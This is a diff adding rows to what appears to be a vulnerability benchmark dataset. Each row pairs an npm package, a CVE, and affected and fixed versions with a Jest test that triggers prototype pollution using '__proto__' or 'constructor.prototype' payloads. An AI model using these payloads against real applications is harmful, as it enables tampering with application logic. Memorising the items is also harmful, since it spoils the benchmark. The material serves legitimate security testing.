+",n/a,bin/format/oojs.js:65:39,https://security.snyk.io/vuln/SNYK-JS-NODEOOJS-598678; https://github.com/advisories/GHSA-j4rw-x3vg-c8r7
+prototype-pollution,CVE-2021-23329,nested-object-assign,1.0.3,1.0.4,prototype-pollution/nested-object-assign_1.0.3,"//https://snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977
+
+test(""prototype pollution in nested-object-assign"", () => {
+  const assign = require(""nested-object-assign"");
+  expect({}.polluted).toBe(undefined);
+  assign({}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/nestedObjectAssign.js:1:787,https://security.snyk.io/vuln/SNYK-JS-NESTEDOBJECTASSIGN-1065977; https://github.com/advisories/GHSA-c497-v8pv-ch6x
+prototype-pollution,,plain-object-merge,1.0.1,1.0.2,prototype-pollution/plain-object-merge_1.0.1,"//https://hackerone.com/reports/871156
+test(""prototype pollution in plain-object-merge"", () => {
+  const merge = require(""plain-object-merge"");
+  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  merge([{}, payload]);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/fabiospampinato/plain-object-merge/commit/e2b59efa2216957815643c48797e2e2eae8ca2b2,dist/index.js:18:29,https://security.snyk.io/vuln/SNYK-JS-PLAINOBJECTMERGE-1085643; 
+prototype-pollution,CVE-2021-3918,json-schema,0.3.0,0.4.0,prototype-pollution/json-schema_0.3.0,"//https://huntr.dev/bounties/bb6ccd63-f505-4e3a-b55f-cd2662c261a9/
+test(""prototype pollution in json-schema"", () => {
+  const { validate } = require(""json-schema"");
+  const instance = JSON.parse(`
+    {
+      ""$schema"":{
+        ""type"": ""object"",
+        ""properties"":{
+          ""__proto__"": {
+            ""type"": ""object"",
+            
+            ""properties"":{
+              ""polluted"": {
+                  ""type"": ""string"",
+                  ""default"": ""yes""
+              }
+            }
+          }
+        },
+        ""__proto__"": {}
+      }
+    }`);
+
+  expect({}.polluted).toBe(undefined);
+
+  validate(instance);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/kriszyp/json-schema/commit/22f146111f541d9737e832823699ad3528ca7741,lib/validate.js:217:27,https://huntr.dev/bounties/bb6ccd63-f505-4e3a-b55f-cd2662c261a9/; https://github.com/advisories/GHSA-896r-f27r-55mw; https://security.snyk.io/vuln/SNYK-JS-JSONSCHEMA-1920922
+prototype-pollution,,flat-wrap,1.0.2,n/a,prototype-pollution/flat-wrap_1.0.2,"test(""prototype pollution in flat-wrap"", () => {
+  const { unflatten } = require(""flat-wrap"");
+
+  expect({}.polluted).toBe(undefined);
+
+  unflatten({
+    ""__proto__.polluted"": ""yes"",
+  });
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:193:43,https://github.com/advisories/GHSA-g7h8-p22m-2rvx; 
+prototype-pollution,CVE-2021-25915,changeset,0.1.0,0.2.6,prototype-pollution/changeset_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25915
+test(""prototype pollution in changeset"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const changeset = require(""changeset"");
+  const patch = [{ type: ""put"", key: [""__proto__"", ""polluted""], value: ""yes"" }];
+  changeset.apply(patch, {}, true);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/eugeneware/changeset/commit/9e588844edbb9993b32e7366cc799262b4447f99,index.js:81:25,https://security.snyk.io/vuln/SNYK-JS-CHANGESET-1083989; 
+prototype-pollution,CVE-2020-28450,decal,2.1.3,n/a,prototype-pollution/decal_2.1.3,"//https://snyk.io/vuln/SNYK-JS-DECAL-1051028
+test(""prototype pollution in decal"", () => {
+  const decal = require(""decal"");
+
+  expect({}.polluted).toBe(undefined);
+
+  const o = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  decal.extend({}, true, o);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,src/utils/extend.js:50:62,https://security.snyk.io/vuln/SNYK-JS-DECAL-1051028; https://github.com/advisories/GHSA-j32x-j8pj-pg2h
+prototype-pollution,CVE-2021-3645,@viking04/merge,1.0.0,1.0.2,prototype-pollution/viking04-merge_1.0.0,"//https://github.com/viking04/merge/commit/baba40332080b38b33840d2614df6d4142dedaf6
+test(""prototype pollution in config-handler"", () => {
+  const merge = require(""@viking04/merge"");
+  expect({}.polluted).toBe(undefined);
+
+  let a = {};
+  var prototype_pollution_test = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  merge(a, prototype_pollution_test);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/viking04/merge/commit/baba40332080b38b33840d2614df6d4142dedaf6,merge/index.js:9:18,https://security.snyk.io/vuln/SNYK-JS-VIKING04MERGE-1584118; https://github.com/advisories/GHSA-cqqh-49mx-fq63
+prototype-pollution,CVE-2021-23438,mpath,0.4.1,0.8.4,prototype-pollution/mpath_0.4.1,"//https://hackerone.com/reports/390860
+test(""prototype pollution in mpath "", () => {
+  var mpath = require(""mpath"");
+
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  mpath.set(""__proto__.polluted"", ""yes"", obj);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/aheckmann/mpath/commit/89402d2880d4ea3518480a8c9847c541f2d824fc,lib/index.js:269:17,https://security.snyk.io/vuln/SNYK-JS-MPATH-1577289; https://github.com/advisories/GHSA-p92x-r36w-9395
+prototype-pollution,CVE-2020-7722,nodee-utils,1.2.2,1.2.3,prototype-pollution/nodee-utils_1.2.2,"//https://snyk.io/vuln/SNYK-JS-NODEEUTILS-598679
+
+test(""prototype pollution in nodee-utils"", () => {
+  const { object } = require(""nodee-utils"");
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  object.deepSet({}, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/nodee-apps/utils/commit/52460d936c52f03c9907bc99ac5e890970cef83c,lib/object.js:210:40,https://security.snyk.io/vuln/SNYK-JS-NODEEUTILS-598679; https://github.com/advisories/GHSA-p6jh-p7q8-pcrg
+prototype-pollution,CVE-2020-7639,@eivifj/dot,1.0.2,1.0.3,prototype-pollution/eivifj-dot_1.0.2,"//https://snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435
+test(""prototype pollution in @eivifj/dot"", () => {
+  const a = require(""@eivifj/dot"");
+  const path = ""__proto__.polluted"";
+
+  expect({}.polluted).toBe(undefined);
+
+  a.set({}, path, ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,dot/index.js:22:13,https://security.snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435; 
+prototype-pollution,,i18next,19.7.0,19.8.5,prototype-pollution/i18next_19.7.0,"//https://hackerone.com/reports/968355#:~:text=It%20allows%20to%20set%20many,example%2C%20you%20can%20call%20i18next.&text=To%20pollute%20Object%20you%20could,polluted%3A%20true%20%7D%20%7D%20%7D%20.
+
+// const i18next = require(""i18next/dist/cjs/i18next"");
+
+function deepExtend(target, source, overwrite) {
+  /* eslint no-restricted-syntax: 0 */
+  for (const prop in source) {
+    if (prop !== ""__proto__"") {
+      if (prop in target) {
+        // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch
+        if (
+          typeof target[prop] === ""string"" ||
+          target[prop] instanceof String ||
+          typeof source[prop] === ""string"" ||
+          source[prop] instanceof String
+        ) {
+          if (overwrite) target[prop] = source[prop];
+        } else {
+          deepExtend(target[prop], source[prop], overwrite);
+        }
+      } else {
+        target[prop] = source[prop];
+      }
+    }
+  }
+  return target;
+}
+
+test(""prototype pollution in i18next "", () => {
+  const translations =
+    '{ ""constructor"": { ""prototype"": { ""polluted"": ""yes""} } }';
+  const existingData = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  deepExtend(existingData, JSON.parse(translations), true);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/i18next/i18next/commit/932f5f662893376254d826e9b01dc4e4c0cd91c0,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-I18NEXT-1065979; https://github.com/advisories/GHSA-cmh5-qc8w-xvcq
+prototype-pollution,,shvl,2.0.1,2.0.3,prototype-pollution/shvl_2.0.1,"//https://snyk.io/vuln/SNYK-JS-SHVL-1085284
+
+test(""prototype pollution in shvl"", () => {
+  var shvl = require(""shvl"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  shvl.set(obj, ""constructor.prototype.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/robinvdvleuten/shvl/commit/4ed0edfa70f7778556f7b7e9ef1ee5d6d002fce2,index.js:10:40,https://security.snyk.io/vuln/SNYK-JS-SHVL-1085284; 
+prototype-pollution,CVE-2020-15256,object-path-set,1.0.0,1.0.1,prototype-pollution/object-path-set_1.0.0,"//https://snyk.io/vuln/SNYK-JS-OBJECTPATH-1017036
+test(""prototype pollution in object-path-set "", () => {
+  const setPath = require(""object-path-set"");
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  setPath({}, ""__proto__.polluted"", ""yes"");
+  expect(obj.polluted).toBe(""yes"");
+});
+",https://github.com/skratchdot/object-path-set/commit/55f06d75abf5885f9cba3b7760acb38d7d7d06c0,index.js:19:13,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATHSET-607908; https://github.com/advisories/GHSA-cwx2-736x-mf6w
+prototype-pollution,CVE-2020-7701,madlib-object-utils,0.1.6,0.1.7,prototype-pollution/madlib-object-utils_0.1.6,"//https://snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676
+test(""prototype pollution in madlib-object-utils"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const objectUtils = require(""madlib-object-utils"");
+  objectUtils.setValue(""__proto__.polluted"", {}, ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/utils.js:56:22,https://security.snyk.io/vuln/SNYK-JS-MADLIBOBJECTUTILS-598676; https://github.com/advisories/GHSA-jvf5-q4h5-2jmj
+prototype-pollution,CVE-2019-10744,lodash,4.17.10,4.17.12,prototype-pollution/lodash_4.17.10,"//https://security.snyk.io/vuln/SNYK-JS-LODASH-450202
+test(""prototype pollution in lodash"", () => {
+  const mergeFn = require(""lodash"").defaultsDeep;
+  const payload = '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}';
+  expect({}.polluted).toBe(undefined);
+
+  mergeFn({}, JSON.parse(payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/sailshq/lodash/pull/1/commits/c3fd203b3be87a8177f7f00824033c95f981f984,lodash.js:2573:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-450202; https://github.com/advisories/GHSA-jf85-cpcp-j695
+prototype-pollution,CVE-2020-28503,copy-props,2.0.4,2.0.5,prototype-pollution/copy-props_2.0.4,"//https://snyk.io/vuln/SNYK-JS-COPYPROPS-1082870
+test(""prototype pollution in copy-props"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const copyProps = require(""copy-props"");
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+  copyProps(JSON.parse(malicious_payload), {});
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:197:14,https://security.snyk.io/vuln/SNYK-JS-COPYPROPS-1082870; https://github.com/advisories/GHSA-897m-rjf5-jp39
+prototype-pollution,CVE-2021-23373,set-deep-prop,1.0.0,n/a,prototype-pollution/set-deep-prop_1.0.0,"//https://snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231
+test(""prototype pollution in safe-object2"", () => {
+  const setDeepProp = require(""set-deep-prop"");
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  setDeepProp({}, [""__proto__"", ""polluted""], ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,set-deep-prop.js:20:34,https://security.snyk.io/vuln/SNYK-JS-SETDEEPPROP-1083231; 
+prototype-pollution,,fast-json-patch,2.0.4,2.2.1,prototype-pollution/fast-json-patch_2.0.4,"//https://github.com/Starcounter-Jack/JSON-Patch/issues/216
+test(""prototype pollution in fast-json-patch"", () => {
+  let fp = require(""fast-json-patch"");
+  const patch = [{ op: ""replace"", path: ""/__proto__/polluted"", value: ""yes"" }];
+
+  expect({}.polluted).toBe(undefined);
+
+  fp.applyPatch({}, patch);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/Starcounter-Jack/JSON-Patch/pull/219/commits/dd5d353f5d65888aeac91359484a73f0e2a9e5bd,lib/core.js:28:18,https://security.snyk.io/vuln/SNYK-JS-FASTJSONPATCH-595663; 
+prototype-pollution,CVE-2021-32736,think-helper,1.1.0,1.1.7,prototype-pollution/think-helper_1.1.0,"//
+test(""prototype pollution in think-helper"", () => {
+  const a = require(""think-helper"");
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  a.extend(obj, JSON.parse('{""__proto__"":{""polluted"":""yes""}}'));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",,index.js:122:22,https://security.snyk.io/vuln/SNYK-JS-THINKHELPER-1315383; https://github.com/advisories/GHSA-vr5m-3h59-7jcp
+prototype-pollution,CVE-2019-10746,mixin-deep,2.0.0,2.0.1,prototype-pollution/mixin-deep_2.0.0,"//https://snyk.io/vuln/SNYK-JS-MIXINDEEP-450212
+test(""prototype pollution in mixin-deep "", () => {
+  const mixin = require(""mixin-deep"");
+  const payload = '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}';
+
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  mixin({}, JSON.parse(payload));
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jonschlinkert/mixin-deep/commit/8f464c8ce9761a8c9c2b3457eaeee9d404fa7af9,index.js:21:17,https://security.snyk.io/vuln/SNYK-JS-MIXINDEEP-450212; https://github.com/advisories/GHSA-fhjf-83wg-r2j9
+prototype-pollution,CVE-2021-4278,tree-kit,0.6.1,0.7.0,prototype-pollution/tree-kit_0.6.1,"test(""prototype pollution in tree-kit"", () => {
+  const { dotPath } = require('tree-kit')
+  obj = {};
+  expect({}.polluted).toBe(undefined);
+  dotPath.set({}, [""__proto__"", ""polluted""], ""yes"") 
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/cronvel/tree-kit/commit/c90d45f4f0e1266867be136670eddeb99b2a32a5,,https://security.snyk.io/vuln/SNYK-JS-TREEKIT-1077068; 
+prototype-pollution,CVE-2020-7641,grunt-util-property,0.0.2,n/a,prototype-pollution/grunt-util-property_0.0.2,"//https://snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088
+test(""prototype pollution in grunt-util-property"", () => {
+  const grunt = require(""grunt"");
+  const a = require(""grunt-util-property"");
+
+  expect({}.polluted).toBe(undefined);
+
+  let b = a(grunt);
+  b.call({}, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,main.js:41:21,https://security.snyk.io/vuln/SNYK-JS-GRUNTUTILPROPERTY-565088; 
+prototype-pollution,CVE-2020-7617,ini-parser,0.0.2,n/a,prototype-pollution/ini-parser_0.0.2,"// https://snyk.io/vuln/SNYK-JS-INIPARSER-564122
+test(""prototype pollution in ini-parser"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  let a = require(""ini-parser"");
+  a.parse(""[__proto__]\npolluted=yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:14:20,https://security.snyk.io/vuln/SNYK-JS-INIPARSER-564122; https://github.com/advisories/GHSA-96r7-mrqf-jhcc
+prototype-pollution,CVE-2020-28274,deepref,1.1.1,1.2.1,prototype-pollution/deepref_1.1.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28274
+test(""prototype pollution in deepref"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const deepref = require(""deepref"");
+  deepref.set({}, ""__proto__.polluted"", ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/isaymatato/deepref/commit/24935e6a1060cb09c641d3075982f0b44cfca4c2,index.js:29:28,https://security.snyk.io/vuln/SNYK-JS-DEEPREF-1049536; https://github.com/advisories/GHSA-7c7g-72q7-4xhm
+prototype-pollution,CVE-2020-8203,lodash,4.17.11,4.17.16,prototype-pollution/lodash_4.17.11,"// https://hackerone.com/reports/712065
+test(""prototype pollution in lodash"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const _ = require(""lodash"");
+  _.zipObjectDeep([""__proto__.polluted""], [""yes""]);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lodash.js:2559:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-608086; https://github.com//advisories/GHSA-p6mc-m468-83gw
+prototype-pollution,CVE-2020-7714,confucious,0.0.12,n/a,prototype-pollution/confucious_0.0.12,"//https://snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665
+test(""prototype pollution in confucious"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const confucious = require(""confucious"");
+  confucious.set(""__proto__:polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,confucious.js:48:21,https://security.snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665; https://github.com/advisories/GHSA-fmrr-mx6j-h3h5
+prototype-pollution,CVE-2020-7707,property-expr,2.0.2,2.0.3,prototype-pollution/property-expr_2.0.2,"//https://hackerone.com/reports/910206
+test(""prototype pollution in property-expr"", () => {
+  let expr = require(""property-expr"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  expr.setter(""constructor.prototype.polluted"")(obj, ""yes"");
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/jquense/expr/commit/df846910915d59f711ce63c1f817815bceab5ff7,index.js:55:28,https://security.snyk.io/vuln/SNYK-JS-PROPERTYEXPR-598800; https://github.com/advisories/GHSA-6fw4-hr69-g3rv
+prototype-pollution,,rfc6902,4.0.2,5.0.0,prototype-pollution/rfc6902_4.0.2,"//https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318
+test(""prototype pollution in rfc6902"", () => {
+  expect({}.polluted).toBe(undefined);
+  var rfc6902 = require(""rfc6902"");
+  var obj = {};
+  rfc6902.applyPatch(obj, [
+    { op: ""add"", path: ""/__proto__/polluted"", value: ""yes"" },
+  ]);
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,patch.js:57:21,https://security.snyk.io/vuln/SNYK-JS-RFC6902-1053318; 
+prototype-pollution,CVE-2020-28462,ion-parser,0.5.2,n/a,prototype-pollution/ion-parser_0.5.2,"//https://snyk.io/vuln/SNYK-JS-IONPARSER-1048971
+test(""prototype pollution in ion-parser"", () => {
+  const fs = require(""fs"");
+  const path = require(""path"");
+  const ION = require(""ion-parser"");
+
+  let obj = {};
+  expect({}.polluted).toBe(undefined);
+
+  ION.parse(
+    fs.readFileSync(path.resolve(__dirname, ""./payload.toml""), ""utf-8"")
+  );
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,parser.js:359:13,https://security.snyk.io/vuln/SNYK-JS-IONPARSER-1048971; 
+prototype-pollution,,keyd,1.3.4,1.4.3,prototype-pollution/keyd_1.3.4,"//https://hackerone.com/reports/877515
+test(""prototype pollution in keyd"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const keyd = require(""keyd"");
+  keyd({}).set(""__proto__.polluted"", ""yes""); //payload
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:76:60,https://security.snyk.io/vuln/SNYK-JS-KEYD-674472; 
+prototype-pollution,,objutil,2.17.3,n/a,prototype-pollution/objutil_2.17.3,"//https://snyk.io/vuln/SNYK-JS-OBJUTIL-559496
+
+test(""prototype pollution in objutil"", () => {
+  const { merge, remove } = require(""objutil"");
+
+  let a = { x: 1, y: { w: 1, z: 2 } };
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  result = merge(a, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,dist/objutil.cjs.js:192:59,https://security.snyk.io/vuln/SNYK-JS-OBJUTIL-559496; 
+prototype-pollution,,prototyped.js,2.0.0,2.0.1,prototype-pollution/prototyped.js_2.0.0,"//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
+test(""prototype pollution in merge-recursive"", () => {
+  // const merge = require(""merge-recursive"").recursive;
+  // const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+  // obj = {};
+
+  // expect({}.polluted).toBe(undefined);
+
+  // merge({}, JSON.parse(malicious_payload));
+
+  // expect({}.polluted).toBe(""yes"");
+
+  const set = require(""prototyped.js/dist/object/set"").default;
+  console.log(""Prototype before set"", {}.polluted);
+  set({}, ""__proto__.isAdmin"", true);
+  console.log(""Prototype after set"", {}.polluted);
+});
+",https://github.com/ardalanamini/prototyped.js/commit/3ab56e78250d3d5b44ac03938d3d04591b206730,lib/index.js:66:14,https://security.snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824; 
+prototype-pollution,,objtools,3.0.0,n/a,prototype-pollution/objtools_3.0.0,"//https://hackerone.com/reports/878394
+
+test(""prototype pollution in objtools"", () => {
+  const objtools = require(""objtools"");
+  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}'); //payload
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  objtools.merge({}, payload);
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/index.js:440:18,https://security.snyk.io/vuln/SNYK-JS-OBJTOOLS-674471; 
+prototype-pollution,CVE-2020-7742,simpl-schema,1.10.0,1.10.2,prototype-pollution/simpl-schema_1.10.0,"//https://snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157
+test(""prototype pollution in simpl-schema"", () => {
+  const SimpleSchema = require(""simpl-schema"").default;
+  let obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  SimpleSchema.setDefaultMessages(
+    JSON.parse('{""__proto__"":{""polluted"":""yes""}}')
+  );
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,dist/utility/merge.js:31:27,https://security.snyk.io/vuln/SNYK-JS-SIMPLSCHEMA-1016157; https://github.com/advisories/GHSA-9mx2-prfp-8hqp
+prototype-pollution,CVE-2018-3751,merge-recursive,0.0.3,n/a,prototype-pollution/merge-recursive_0.0.3,"//https://snyk.io/vuln/SNYK-JS-PROTOTYPEDJS-1069824
+test(""prototype pollution in merge-recursive"", () => {
+  const merge = require(""merge-recursive"").recursive;
+  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  merge({}, JSON.parse(malicious_payload));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/index.js:66:14,https://security.snyk.io/vuln/npm:merge-recursive:20180415; https://github.com/advisories/GHSA-cvxm-f295-x957
+prototype-pollution,CVE-2021-25949,set-getter,0.1.0,0.1.1,prototype-pollution/set-getter_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25949
+test(""prototype pollution in set-getter "", () => {
+  var setGetter = require(""set-getter"");
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  setGetter(obj, ""__proto__.polluted"", function (polluted) {
+    return ""yes"";
+  });
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/doowb/set-getter/commit/66eb3f0d4686a4a8c7c3d6f7ecd8e570b580edc4,,https://security.snyk.io/vuln/SNYK-JS-SETGETTER-1303099; https://github.com/advisories/GHSA-jv35-xqg7-f92r
+prototype-pollution,CVE-2020-7743,mathjs,7.4.0,7.5.1,prototype-pollution/mathjs_7.4.0,"//https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7743
+test(""prototype pollution in mathjs "", () => {
+  var mathMod = require(""mathjs"");
+  const mathjs = mathMod.create(mathMod.all);
+
+  expect({}.polluted).toBe(undefined);
+
+  const newConfig = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
+  mathjs.config(newConfig);
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/josdejong/mathjs/commit/ecb80514e80bce4e6ec7e71db8ff79954f07c57e,lib/utils/object.js:131:17,https://security.snyk.io/vuln/SNYK-JS-MATHJS-1016401; https://github.com/advisories/GHSA-x2fc-mxcx-w4mf
+prototype-pollution,CVE-2020-7643,paypal-adaptive,0.4.1,n/a,prototype-pollution/paypal-adaptive_0.4.1,"//https://snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089
+
+test(""prototype pollution in paypal-adaptive"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const PayPal = require(""paypal-adaptive"");
+  const p = new PayPal(
+    JSON.parse(
+      '{""__proto__"": {""polluted"": ""yes""}, ""userId"": ""foo"", ""password"": ""bar"", ""signature"": ""abcd"", ""appId"": ""1234"", ""sandbox"": ""1234""}'
+    )
+  );
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/paypal-adaptive.js:31:22,https://security.snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089; https://github.com/advisories/GHSA-v3r2-3fp4-rp46
+prototype-pollution,,nestie,1.0.0,1.0.2,prototype-pollution/nestie_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25947
+test(""prototype pollution in nestie"", () => {
+  const { nestie } = require(""nestie"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  nestie({ ""__proto__.polluted"": ""yes"" });
+
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/lukeed/nestie/commit/c571c77928ecd7f256a935c7c3860f33dac4653f,dist/index.js:29:14,https://security.snyk.io/vuln/SNYK-JS-NESTIE-1300518; https://github.com/advisories/GHSA-m7rg-8wvq-846v
+prototype-pollution,CVE-2018-16492,extend,3.0.1,1.0.1,prototype-pollution/extend_3.0.1,"//https://hackerone.com/reports/381185
+test(""prototype pollution in extend "", () => {
+  let extend = require(""extend"");
+  let payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
+
+  var obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  extend(true, {}, payload);
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/justmoon/node-extend/commit/0e68e71d93507fcc391e398bc84abd0666b28190,index.js:77:20,https://security.snyk.io/vuln/npm:extend:20180424; https://github.com/advisories/GHSA-qrmc-fj45-qfc2
+prototype-pollution,CVE-2021-25913,set-or-get,1.2.10,1.2.11,prototype-pollution/set-or-get_1.2.10,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25913
+
+test(""prototype pollution in set-or-get"", () => {
+  var SetOrGet = require(""set-or-get"");
+  obj = {};
+
+  expect({}.polluted).toBe(undefined);
+
+  SetOrGet(obj, ""__proto__"", {}).polluted = ""yes"";
+  expect({}.polluted).toBe(""yes"");
+});
+",https://github.com/IonicaBizau/set-or-get.js/commit/82ede5cccb2e8d13e4f62599203a4389f6d8e936,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-SETORGET-1070806; https://github.com/advisories/GHSA-6rv4-4qv6-88g2
+prototype-pollution,CVE-2020-7736,bmoor,0.8.11,0.8.12,prototype-pollution/bmoor_0.8.11,"//https://snyk.io/vuln/SNYK-JS-BMOOR-598664
+test(""prototype pollution in bmoor"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const bmoor = require(""bmoor"");
+  bmoor.set({}, ""__proto__.polluted"", ""yes"");
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,src/core.js:194:18,https://security.snyk.io/vuln/SNYK-JS-BMOOR-598664; https://github.com/advisories/GHSA-h3rx-g5c9-8q4x
+prototype-pollution,CVE-2021-23700,merge-deep2,3.0.5,n/a,prototype-pollution/merge-deep2_3.0.5,"//https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593
+test(""prototype pollution in merge-deep2"", () => {
+  const mergeDeep2 = require(""merge-deep2"");
+  let obj = {};
+  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
+
+  expect({}.polluted).toBe(undefined);
+
+  mergeDeep2({}, JSON.parse(malicious_payload), true);
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,index.js:45:19,https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593; https://github.com/advisories/GHSA-j28q-p8ww-cp87
+prototype-pollution,CVE-2021-23432,mootools,1.5.2,n/a,prototype-pollution/mootools_1.5.2,"//https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536
+test(""prototype pollution in mootools"", () => {
+  require(""mootools"");
+
+  expect({}.polluted).toBe(undefined);
+
+  Object.merge({}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/mootools-core-1.5.2-server.js:355:24,https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536; https://github.com/advisories/GHSA-x6hx-7gh3-3q98
+prototype-pollution,CVE-2020-28279,flattenizer,0.0.5,1.1.1,prototype-pollution/flattenizer_0.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28279
+test(""prototype pollution in flattenizer"", () => {
+  expect({}.polluted).toBe(undefined);
+
+  const flattenizer = require(""flattenizer"");
+  flattenizer.unflatten({ ""__proto__.polluted"": ""yes"" });
+
+  expect({}.polluted).toBe(""yes"");
+});
+",n/a,lib/flattenizer.min.js:1:1550,https://security.snyk.io/vuln/SNYK-JS-FLATTENIZER-1054934; 
